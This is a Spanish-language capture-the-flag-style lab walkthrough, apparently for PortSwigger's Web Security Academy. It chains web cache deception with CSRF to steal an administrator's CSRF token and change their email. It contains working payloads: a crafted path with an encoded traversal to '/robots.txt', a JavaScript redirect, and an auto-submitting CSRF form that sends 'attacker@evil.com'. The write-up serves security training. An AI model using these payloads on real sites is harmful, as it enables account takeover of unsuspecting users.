# 5. WDC con CSRF

## 🌐 Web Cache Deception con reglas de coincidencia exacta y CSRF chaining

### 📄 Descripción del laboratorio

La aplicación permite cambiar el **correo electrónico del usuario** mediante una funcionalidad protegida por **token CSRF válido por sesión**.

El sistema de caché frontal aplica una regla de **coincidencia exacta** y cachea únicamente el recurso:

```
/robots.txt
```

Existe una discrepancia de normalización entre el **backend** y el **sistema de caché**, lo que permite engañar a la caché para almacenar contenido dinámico sensible.

Esto permite:

* Cachear la página **/my-account del administrador**
* Extraer su **token CSRF**
* Usarlo en un ataque **CSRF encadenado** para cambiar su correo electrónico

El objetivo del laboratorio es:

1. Cachear `/my-account` del administrador bajo una ruta que la caché trate como `/robots.txt`
2. Recuperar el **token CSRF** cacheado
3. Ejecutar un **CSRF válido** para cambiar su correo electrónico

Credenciales proporcionadas:

```
wiener:peter
```

***

### 📚 Teoría

Este ataque combina **Web Cache Deception** con **CSRF chaining**, explotando una discrepancia de normalización entre el backend y el sistema de caché.

#### 📌 Comportamientos clave

**Sistema de caché frontal**

* Cachea únicamente el recurso:

```
/robots.txt
```

* Decodifica y normaliza secuencias de **path traversal codificado**

**Servidor de aplicación**

* Ignora el delimitador:

```
;
```

* Trata rutas como:

```
/my-account;anything
```

como si fueran simplemente:

```
/my-account
```

#### 🎯 Vector de ataque

Al combinar:

* Delimitador `;`
* Path traversal codificado:

```
%2f%2e%2e%2f
```

* Un recurso cacheado (`/robots.txt`)

se consigue que:

* El **backend devuelva `/my-account`**, incluyendo el token CSRF del administrador
* La **caché normalice la ruta y almacene la respuesta como `/robots.txt`**

Posteriormente:

* Se recupera el **token CSRF cacheado**
* Se ejecuta un **ataque CSRF válido contra el administrador**

Este tipo de ataque es especialmente grave porque permite **comprometer cuentas mediante cambios de correo electrónico**.

***

### 📝 Práctica

#### 1️⃣ Análisis inicial

Iniciamos sesión con las credenciales:

```
wiener:peter
```

Accedemos a:

```
/my-account
```

Observamos que existe una funcionalidad para **cambiar el correo electrónico**, protegida por un **token CSRF**.

Interceptamos la petición `POST` correspondiente y confirmamos que:

* El token CSRF es **obligatorio**
* El token es **único por sesión**

Conclusión: necesitamos obtener el **token CSRF del administrador**.

<figure><img src="../../../.gitbook/assets/image (415).png" alt=""><figcaption></figcaption></figure>

***

#### 2️⃣ Identificación de delimitadores válidos

Probamos fuerza bruta de delimitadores utilizando **Burp Intruder**.

Posición del payload:

```
/my-account$$
```

<figure><img src="../../../.gitbook/assets/image (416).png" alt=""><figcaption></figcaption></figure>

Resultados observados:

* Los delimitadores `?` y `;` devuelven **200 OK**
* El backend los ignora o los trata como separadores válidos

***

#### 3️⃣ Identificación del recurso cacheado

Probamos distintas rutas manipuladas:

```
/my-account?test
/my-account#test
```

Resultado:

* La caché **no se activa**

Utilizamos herramientas de descubrimiento de contenido y observamos que:

```
/robots.txt
```

devuelve cabeceras como:

```http
X-Cache: HIT
```

<figure><img src="../../../.gitbook/assets/image (417).png" alt=""><figcaption></figcaption></figure>

Conclusión: la caché aplica **reglas estrictas de coincidencia exacta** para `/robots.txt`.

***

#### 4️⃣ Construcción de la ruta engañosa

Construimos una URL que combine:

* Backend que ignora `;`
* Caché que normaliza path traversal

Ruta utilizada:

```
/my-account;%2f%2e%2e%2frobots.txt
```

<figure><img src="../../../.gitbook/assets/image (952).png" alt=""><figcaption></figcaption></figure>

Comportamiento:

* El **backend procesa `/my-account`**
* La **caché normaliza la ruta y la interpreta como `/robots.txt`**

Para evitar colisiones de caché añadimos un parámetro:

```
/my-account;%2f%2e%2e%2frobots.txt?hacked
```

***

#### 5️⃣ Cachear la respuesta del administrador

Creamos un exploit en el **Exploit Server** que redirija automáticamente a la víctima.

{% code overflow="wrap" %}
```html
<script>
document.location = "https://ID-LAB.web-security-academy.net/my-account;%2f%2e%2e%2frobots.txt?hacked";
</script>
```
{% endcode %}

Guardamos el exploit con **Store** y ejecutamos **Deliver exploit to victim**.

<figure><img src="../../../.gitbook/assets/image (419).png" alt=""><figcaption></figcaption></figure>

Cuando el administrador visita la URL manipulada:

* El backend devuelve su página `/my-account`
* La respuesta contiene su **token CSRF**
* La caché almacena la respuesta como si fuera `/robots.txt`

***

#### 6️⃣ Extraer el token CSRF

Accedemos a la URL manipulada:

```
/my-account;%2f%2e%2e%2frobots.txt?hacked
```

<figure><img src="../../../.gitbook/assets/image (420).png" alt=""><figcaption></figcaption></figure>

La respuesta corresponde al **contenido cacheado del administrador**.

Inspeccionamos el HTML y encontramos su **token CSRF válido**.

<figure><img src="../../../.gitbook/assets/image (421).png" alt=""><figcaption></figcaption></figure>

***

#### 7️⃣ Ejecutar el CSRF final

Copiamos el token CSRF del administrador.

Interceptamos nuestra petición legítima de cambio de correo y sustituimos:

* `email` por una dirección controlada por el atacante
* `csrf` por el **token del administrador**

Generamos el **CSRF PoC** con Burp:

{% code overflow="wrap" %}
```html
<html>
<body>
<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="attacker@evil.com">
<input type="hidden" name="csrf" value="TOKEN_DEL_ADMIN">
<input type="submit" value="Submit request">
</form>
<script>
history.pushState('', '', '/');
document.forms[0].submit();
</script>
</body>
</html>
```
{% endcode %}

Guardamos el exploit y ejecutamos **Deliver exploit to victim**.

<figure><img src="../../../.gitbook/assets/image (423).png" alt=""><figcaption></figcaption></figure>

***

#### 8️⃣ Resultado

* Web Cache Deception mediante discrepancia de normalización
* Uso de delimitador `;` ignorado por el backend
* Uso de path traversal codificado (`%2f%2e%2e%2f`)
* Cacheo de `/my-account` bajo `/robots.txt`
* Extracción del **token CSRF del administrador**
* Ejecución de **CSRF chaining**
* Cambio del correo del administrador a uno controlado por el atacante
* Laboratorio resuelto
